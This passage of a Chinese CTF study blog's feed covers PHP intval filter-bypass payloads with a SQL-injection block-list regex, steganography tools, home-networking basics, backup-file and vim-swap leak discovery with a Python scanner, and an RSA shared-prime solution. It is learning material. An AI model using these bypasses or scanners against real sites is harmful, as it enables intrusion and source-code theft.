class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;+42&#x27;</span>);                  <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;-42&#x27;</span>);                 <span class="hljs-comment">// -42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">042</span>);              <span class="hljs-comment">// 34  被解析成八进制，以0开头，注意一定不要带引号</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;042&#x27;</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">1e10</span>);                    <span class="hljs-comment">// 1410065408</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;1e10&#x27;</span>);                  <span class="hljs-comment">// 1</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">0x1A</span>);                    <span class="hljs-comment">// 26</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42000000</span>);                <span class="hljs-comment">// 42000000</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">420000000000000000000</span>);   <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;420000000000000000000&#x27;</span>); <span class="hljs-comment">// 2147483647</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>, <span class="hljs-number">8</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><blockquote><p><code>preg_match(&quot;/\&#39;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id)</code><br>正则匹配，固定格式是 <code>preg_match(&quot;/ 正则表达式 /i&quot;,$var)</code><br>其中有很多  \ 代表转义的意思</p></blockquote><p><font color=orange><strong>所以的目的都是为了绕过<code>intval($id) &gt; 999</code>传一个1000.（这个1000通过不同形式的方法传入，被intval解析之后会是一个小于1000的值，但是到了sql语句中（可能sql语句的那个地方有比较强大的解析功能），所以正常解析成1000）</strong></font></p><p>接下来一一举例：</p><ul><li><p>单引号、双引号： ‘1e3’    //intval会解析成1</p></li><li><p><code>+ - * /</code> ：999-(-1)    10*100   100/0.1      //intval(999-(-1))应该是999，这样的</p><p>+号虽然绕过了，但是sql语句无法正常解析<br><img src="/picture/web18.png"></p></li><li><p>!（真值取反）:  !!1000 </p></li><li><p>~  （取反）:  ~~1000</p></li><li><p>^（异或） :  1 ^1001</p></li><li><p>|   （按位或） ：0|1000</p></li><li><p>x  （十六进制）:  0x3e8  </p></li><li><p>二进制绕过：  0b1111101000    这一题没有过滤，所以这就是web7的答案</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;所有题目只有过滤的字符有差别，其余并无差别，下面给出的代码是web7的&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>misc其他一些知识点</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/misc%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/misc%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2022-02-13T11:29:39.000Z</published>
    <updated>2022-02-27T05:25:53.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="word隐藏字符"><a href="#word隐藏字符" class="headerlink" title="word隐藏字符"></a>word隐藏字符</h3><p>打开word文档，一片空白，文字隐藏在word中，点击[文件]-&gt;[选项]-&gt;[显示]-&gt;[隐藏字符]  ，即可看到隐藏的文字<br>或者隐藏信息字体和背景色相同，可修改文字颜色</p><h3 id="word文件隐藏"><a href="#word文件隐藏" class="headerlink" title="word文件隐藏"></a>word文件隐藏</h3><p>可以将word文档转换成xml格式，也可以将xml转换成word文档，这导致如果重新打包为word文档的过程中，有可能被隐藏进其他数据</p><p>word本质是一个zip文件，docx文件特性为定义一个了若干xml文件的压缩包，<font color=orange><strong>将文档的后缀名改为.zip</strong></font>,寻找里面的flag文件。Excel文件同样也适用。</p><p>如果zip解压后文件过多，可以使用命令行查找:  </p><ul><li><p><code>findstr /s /i &quot;backup&quot; *.*</code><br>在当前目录及所有子目录下的所有文件中查找”backup”这个字符串，<code>*.*</code>表示所有类型的文件</p></li><li><p><code>findstr /s /i /c:&quot;backup jobs&quot; *.*</code></p><p>查找带有空格的字符串</p></li><li><p><code>findstr /s /i /c:&quot;cmd&quot; C:\tmp\*.txt</code></p><p>在C:\tmp\查找所有txt文件的字符串”cmd”</p></li></ul><h3 id="wbStego4-3open"><a href="#wbStego4-3open" class="headerlink" title="wbStego4.3open"></a>wbStego4.3open</h3><p>这个软件可以把文件隐藏到BMP、TXT、HTM和PDF文件中。<br>同样也可以还原出来</p><h3 id="NTFS上的交换数据流"><a href="#NTFS上的交换数据流" class="headerlink" title="NTFS上的交换数据流"></a>NTFS上的交换数据流</h3><p>概念：</p><ul><li>在NTFS文件系统下，每个文件都可以有多个数据流。流从 windows<br>Mr3.1开始已存在。当在非MTFS卷下读取文件内容时，只能访问及<br>处理一个数据流。</li><li>数据流没有名称。</li></ul><p>特点</p><ul><li>ADS是NTFS文件系统特有的性质</li><li>基于APT的in32却不能很好的支持ADS,例如把一个文件以流的形式附加到另一个文件（载体）中。但是<strong>对 Windows资源管理器来说载体文件没有发生任何变化</strong>(包括其大小、修改时间等)，由此将会产生一系列问题。</li></ul><h2 id="Stegosaurus隐写"><a href="#Stegosaurus隐写" class="headerlink" title="Stegosaurus隐写"></a>Stegosaurus隐写</h2><p><a href="https://github.com/AngelKitty/stegosaurus">AngelKitty/stegosaurus: A steganography tool for embedding payloads within Python bytecode. (github.com)</a></p><p>中文名为剑龙<br>Stegosaurus <strong>是一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload 。</strong>由于编码密度较低，因此我们嵌入 Payload 的过程既不会改变源代码的运行行为，也不会改变源文件的文件大小。 Payload 代码会被分散嵌入到字节码之中，所以类似 strings 这样的代码工具无法查找到实际的 Payload 。 Python 的 dis 模块会返回源文件的字节码，然后我们就可以使用 Stegosaurus 来嵌入 Payload 了。<br><img src="/picture/misc70.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;word隐藏字符&quot;&gt;&lt;a href=&quot;#word隐藏字符&quot; class=&quot;headerlink&quot; title=&quot;word隐藏字符&quot;&gt;&lt;/a&gt;word隐藏字符&lt;/h3&gt;&lt;p&gt;打开word文档，一片空白，文字隐藏在word中，点击[文件]-&amp;gt;[选项]-&amp;gt;[</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc音频隐写</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/misc%E9%9F%B3%E9%A2%91/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/misc%E9%9F%B3%E9%A2%91/</id>
    <published>2022-02-13T10:45:39.000Z</published>
    <updated>2022-02-14T13:00:46.468Z</updated>
    
    <content type="html"><![CDATA[<p>文本本身往往是可以正常播放的音乐，信息通常和音乐本身内容无关，而是以波形等某种形式藏在音频文件中</p><ul><li>频谱分析、波形分析（Audicity）</li><li>摩斯编码、敲击码（基于5乘5方格波利比奥斯方阵)    （通过听文件中的细节）</li><li>工具隐写（steghide、MP3stego)</li></ul><p><img src="/picture/misc48.png"></p><h3 id="Audicity查看波形和频谱"><a href="#Audicity查看波形和频谱" class="headerlink" title="Audicity查看波形和频谱"></a>Audicity查看波形和频谱</h3><p><img src="/picture/misc49.png"><br>这个音频只有一个声道，可能有的音频会有两个声道<br>然后在一个声道的波形中可能会藏着morse密码，或者波形可以转化成二进制这种<br><img src="/picture/misc56.png"><br>morse密码</p><p><img src="/picture/misc52.png"><br>这个图就是转换成二进制</p><p><img src="/picture/misc50.png"><br>有些时候flag会直接藏在频谱图中</p><p><img src="/picture/misc53.png"><br>DTMF，双音多频。可能会在频谱图中出现<br><img src="/picture/misc54.png"></p><p>分离左右两个音轨<br><img src="/picture/misc55.png"><br><a href="https://www.ichunqiu.com/course/63298">学习链接</a>，Audicity的还有一小部分使用在这个视频的最后部分</p><h3 id="MP3Stego隐写"><a href="#MP3Stego隐写" class="headerlink" title="MP3Stego隐写"></a>MP3Stego隐写</h3><p>音频文件同其他格式文件一样可以在比特流中嵌入数据，常用的工具如MP3 Stego,该工具在提取隐写信息时会需要用到密码，因此通常与其它部分结合考察（如压缩包解密等），通过得到的密码来从MP3中提取数据，从而得到隐藏信息</p><p>在Encode.exe和Decode.exe所在文件夹下，cmd<br>写入： Encode.exe -E  <font color=red>hidden_text.txt</font> -P  pass  svega.wav <font color=red>svega_stego. mp3</font>    ( svega.wav是被加密音频，svega_stego. mp3是加密之后的音频，pass是加密设置的密码)<br>●读出： Decode.exe  -X  -P pass <font color=red>svega_stego.mp3</font></p><p>常用的视频隐写工具有MSUstego、Tcstego</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文本本身往往是可以正常播放的音乐，信息通常和音乐本身内容无关，而是以波形等某种形式藏在音频文件中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;频谱分析、波形分析（Audicity）&lt;/li&gt;
&lt;li&gt;摩斯编码、敲击码（基于5乘5方格波利比奥斯方阵)    （通过听文件中的细节）&lt;/li&gt;
&lt;</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络(家庭网络常识等)</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/10/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%AF%86/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/10/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%AF%86/</id>
    <published>2022-02-10T07:54:27.000Z</published>
    <updated>2022-02-11T11:27:49.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="⚽猫、路由器、wifi、拨号"><a href="#⚽猫、路由器、wifi、拨号" class="headerlink" title="⚽猫、路由器、wifi、拨号"></a>⚽猫、路由器、wifi、拨号</h1><p>一根入户光纤插到猫上面，然后用网线连接猫和路由器，然后再用网线连接路由器和电脑，路由器可以发射wifi，用手机或电脑通过wifi连<br>接到路由器。</p><h3 id="猫"><a href="#猫" class="headerlink" title="猫"></a>猫</h3><p>现在使用的一般是光猫(以前是猫)，猫和广猫的区别在于：光猫支持光纤。<br>以前拉到家里面的都是网线，现在大部分都是光纤</p><p>猫的功能：将要传输的信息转换成适合传输的频率、形式等。<br>（数据在光纤中通过光信号进行传输的，光猫就可以把光信号转换成电信号或者其他模拟信号，使其在网线中进行传输）</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>没有路由器的话，那么猫通过网线直接连接到电脑，将会没有wifi，只能支持一台设备上网，每次开机后都需要拨号</p><p>有路由器之后，路由器会自动拨号（路由器连上网了），然后路由器再通过wifi、网线连接其他设备，让其他设备也可以上网</p><h3 id="wifi"><a href="#wifi" class="headerlink" title="wifi"></a>wifi</h3><p>wifi是路由器发射出来的，wifi就像一根无形的网线，连接手机/电脑到路由器</p><p>所以有时候为什么wifi是满格的却不能上网呢，因为wifi连接的是路由器，如果路由器本身没有网，WiFi再强也无法上网。wifi满格只能说明和路由器之间的连接很强</p><h3 id="宽带大小"><a href="#宽带大小" class="headerlink" title="宽带大小"></a>宽带大小</h3><p>为什么20M宽带，最大下载速度只能到2.5M？<br>宽带大小一般用的单位是20Mb，而我们平时一般是MB作单位。<br>1Byte=8bit</p><h4 id="拨号"><a href="#拨号" class="headerlink" title="拨号"></a>拨号</h4><p>拨号是在路由器中进行设置，一般采用ppoe方式进行拨号<br>拨号就是与中国电信（网络云烟）建立一条点对点链路通道，通过这个通道可以访问因特网<br>可以浅显的理解为拨号就是登录宽带，登录后路由器才能接入因特网</p><h1 id="⚽IP地址、子网掩码、网段、网关"><a href="#⚽IP地址、子网掩码、网段、网关" class="headerlink" title="⚽IP地址、子网掩码、网段、网关"></a>⚽IP地址、子网掩码、网段、网关</h1><h4 id="IP地址和子网掩码"><a href="#IP地址和子网掩码" class="headerlink" title="IP地址和子网掩码"></a>IP地址和子网掩码</h4><p>在网络中我们通过ip地址与对应的计算机进行通信<br>例如：192.168.1.1<br>ip地址是32位的二进制数</p><p>windows命令：<code>ipconfig</code></p><p>IP地址是由==网络号和主机号==两部分组成<br>==子网掩码作用：告诉计算机哪些是网络号哪些是主机号==<br>子网掩码与ip地址类似，也是32位二进制数<br>子网掩码例如：255.255.255.0</p><p><img src="/picture/za6.png"><br>1对应的是网络号，0对应的是主机号</p><p>子网掩码另外一种表示方式：192.168.1.1/==24==<br>其中24表示子网掩码中前24位为1</p><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>若目标IP在==同一网段==则可以直接通信不需要经过网关，否则需要<br>IP地址前24为相同则在同一网关：如192.168.1.1和192.168.1.34 就在同一网关</p><p>网关一般是==软件层面的路由器==</p><p>查看与某个IP通信需要经过哪些路由器/网关<br>Windows系统命令： <code>tracert -d ip地址</code><br>如果不加参数-d ，则会将地址解析为主机名会很慢</p><p>域名解析windows命令：<code>nslookup</code><br><img src="/picture/za7.png"><br><img src="/picture/za8.png"><br>所以可以看到确实是需要经过层层网关的</p><h4 id="私网、公网"><a href="#私网、公网" class="headerlink" title="私网、公网"></a>私网、公网</h4><p>ipconfig查看的是私有ip<br>要上网肯定要有公网ip，百度搜索ip，即可看到自己的公网ip了<br><img src="/picture/za9.png"></p><h1 id="⚽端口"><a href="#⚽端口" class="headerlink" title="⚽端口"></a>⚽端口</h1><p>端口分为物理端口和软件端口<br>物理端口：是类似交换机、路由器上面插网线的口就叫物理端口</p><p>计算中有很多软件，当计算机收到数据包时，如何知道数据包时哪个软件的呢？这里就必须说到==端口==了</p><p>数据包中会有源IP和目标IP、源端口和目标端口<br>一个软件可以监听多个端口，当计算机收到一个数据包，计算机就会先检查它的目标端口，然后计算机再查看是否有软件在监听这个端口。如果有，那么这个数据包就会发给这个软件</p><p>如何查看电脑上软件监听的端口呢？<br>win+R<br>输入resmon<br>选择“网络”</p><p><img src="/picture/za10.png"></p><h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><p>NAT（Newwork Address Translation）网络地址转换<br>网络地址即IP地址<br>NAT作用：一般我们没有公网IP，但上因特网需要公网IP，这个时候就会用到NAT</p><p>比如说当我们计算机发送数据包的时候，数据包中会有源IP和目标IP、源端口和目标端口，中国电信（网络运营商）的路由器（拥有公网IP），会替换数据包的源IP（替换成公网IP）和源端口，所以就可以发送到因特网上了。接受数据包，先发送到网络运营商路由器，更改源IP和源端口，再发送给我电脑。</p><h1 id="WiFi信号差怎么办"><a href="#WiFi信号差怎么办" class="headerlink" title="WiFi信号差怎么办"></a>WiFi信号差怎么办</h1><p>1、进路由器后台调节wifi信号强度（用处不大）<br>2、在接入一个路由器<br>原来的路由器称为主路由器，新买的路由器为副路由器，用网线将主路由的LAN口和副路由的WAN口相连，再进入副路由器后台，设置上网方式为动态IP（或DHCP），然后将副路由器放在信号差的地方。<br>缺点：每个路由器都有一个wifi，两个wifi无法漫游（需要手动更换wifi）<br>3、mesh（主流方法）<br>也是需要多个路由器，需要支持mesh的路由器，多个路由器发射同一个WiFi。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;⚽猫、路由器、wifi、拨号&quot;&gt;&lt;a href=&quot;#⚽猫、路由器、wifi、拨号&quot; class=&quot;headerlink&quot; title=&quot;⚽猫、路由器、wifi、拨号&quot;&gt;&lt;/a&gt;⚽猫、路由器、wifi、拨号&lt;/h1&gt;&lt;p&gt;一根入户光纤插到猫上面，然后用网线连接猫和路</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>备份文件泄露</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/08/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/08/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2022-02-08T14:28:38.000Z</published>
    <updated>2022-02-08T15:10:14.517Z</updated>
    
    <content type="html"><![CDATA[<h2 id="disearch目录扫描工具"><a href="#disearch目录扫描工具" class="headerlink" title="disearch目录扫描工具"></a>disearch目录扫描工具</h2><p><a href="https://github.com/maurosoria/dirsearch">下载地址</a><br>我是放在kali里面的</p><p>使用方法:就是用python运行disearch.py文件<br>./dirsearch.py -u 地址 -e php</p><p>-u 指定url<br>-e 指定网站语言<br>-w 可以加上自己的字典（带上路径）<br>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）<br>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</p><p>根据状态码查看是否存在<br><img src="/picture/web17.png"></p><p>所以扫描出了有robots.txt</p><h2 id="常见网站备份文件后缀名和文件名"><a href="#常见网站备份文件后缀名和文件名" class="headerlink" title="常见网站备份文件后缀名和文件名"></a>常见网站备份文件后缀名和文件名</h2><p>文件名：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’<br>后缀名：’tar’, ‘tar.gz’, ‘zip’, ‘rar’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url1 = <span class="hljs-string">&#x27;http://xxx.com&#x27;</span><span class="hljs-comment"># url为被扫描地址，后不加‘/’</span><br><br><span class="hljs-comment"># 常见的网站源码备份文件名</span><br>list1 = [<span class="hljs-string">&#x27;web&#x27;</span>, <span class="hljs-string">&#x27;website&#x27;</span>, <span class="hljs-string">&#x27;backup&#x27;</span>, <span class="hljs-string">&#x27;back&#x27;</span>, <span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-string">&#x27;wwwroot&#x27;</span>, <span class="hljs-string">&#x27;temp&#x27;</span>]<br><span class="hljs-comment"># 常见的网站源码备份文件后缀</span><br>list2 = [<span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;tar.gz&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;rar&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list2:<br>        back = <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(j)<br>        url = <span class="hljs-built_in">str</span>(url1) + <span class="hljs-string">&#x27;/&#x27;</span> + back<br>        <span class="hljs-built_in">print</span>(back + <span class="hljs-string">&#x27;    &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(requests.get(url).status_code)<br></code></pre></td></tr></table></figure><p>其实和disearch原理类似，都是通过状态码来查看文件是否存在。（disearch可以扫备份文件）</p><h2 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h2><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码</p><p>如果打开一个php文件发现什么都没有或报错，可以尝试看看.bak</p><h2 id="vim缓存泄露"><a href="#vim缓存泄露" class="headerlink" title="vim缓存泄露"></a>vim缓存泄露</h2><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：<br>第一次产生的交换文件名为 <code>.index.php.swp</code><br>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件<br>第三次产生的交换文件则为 <code>.index.php.swn</code></p><p>使用curl访问即可直接看到交换文件的内容<br>curl是个非常厉害的东西，很多源码直接访问看不了，但是用curl就可以，看看<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><blockquote><p>博客内容大多来自ctfhub，<a href="https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/ccnRSCCk2nuEt2UWLbn7dL.html">参考博客</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;disearch目录扫描工具&quot;&gt;&lt;a href=&quot;#disearch目录扫描工具&quot; class=&quot;headerlink&quot; title=&quot;disearch目录扫描工具&quot;&gt;&lt;/a&gt;disearch目录扫描工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>密码学刷题(杂)</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98-%E6%9D%82/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98-%E6%9D%82/</id>
    <published>2022-02-07T05:21:28.000Z</published>
    <updated>2022-02-15T08:13:27.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020-BJDCTF-Crypto-rsa"><a href="#2020-BJDCTF-Crypto-rsa" class="headerlink" title="2020-BJDCTF-Crypto-rsa"></a>2020-BJDCTF-Crypto-rsa</h2><p>因为给了e，所以后面有些条件并不用到（如果没有给e，就会用到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>e = <span class="hljs-number">52361</span><br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">assert</span>(e&lt;<span class="hljs-number">100000</span>)<br>n=p*q<br>m=bytes_to_long(flag)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span> c,n<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(<span class="hljs-number">294</span>,e,n)<br><br>p=getPrime(<span class="hljs-number">1024</span>)<br>n=p*q<br>m=bytes_to_long(<span class="hljs-string">&quot;BJD&quot;</span>*<span class="hljs-number">32</span>)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span> c,n<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output:</span><br><span class="hljs-string">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span><br><span class="hljs-string">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span><br><span class="hljs-string">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721  12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br>e = <span class="hljs-number">52361</span><br>c1=<span class="hljs-number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span><br>n1=<span class="hljs-number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span><br>n2=<span class="hljs-number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span><br><br>q=gmpy2.gcd(n1,n2)<br>p=n1//q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c1,d,n1)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br></code></pre></td></tr></table></figure><p>这一题我大意了，我以为是两个同余式，解出e的，没想到e是直接根据pow(294,e,n)爆破出来的。<br>（不知道那个同余式能不能解出来，但应该有点难解）</p><hr><h2 id="GWCTF-2019-BabyRSA"><a href="#GWCTF-2019-BabyRSA" class="headerlink" title="[GWCTF 2019]BabyRSA"></a>[GWCTF 